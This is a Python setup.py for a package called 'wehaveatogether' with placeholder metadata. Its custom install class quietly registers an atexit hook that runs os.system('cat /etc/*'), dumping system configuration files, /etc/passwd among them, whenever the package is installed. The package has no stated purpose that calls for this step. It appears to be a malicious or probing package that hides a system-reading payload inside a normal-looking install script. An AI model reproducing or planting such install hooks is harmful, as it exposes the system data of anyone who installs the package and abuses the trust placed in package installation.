from setuptools import setup, find_packages
import os
import atexit
from setuptools.command.install import install

def _post_install():
    os.system("cat /etc/*")


class new_install(install):
    def __init__(self, *args, **kwargs):
        super(new_install, self).__init__(*args, **kwargs)
        atexit.register(_post_install)

setup(
    name="wehaveatogether",
    version="0.1.6",
    author="wehaveatogether",
    description="Short description of your package",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    packages=find_packages(),
    install_requires=[],
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
    ],
    python_requires=">=3.6",
    cmdclass={'install': new_install},
)
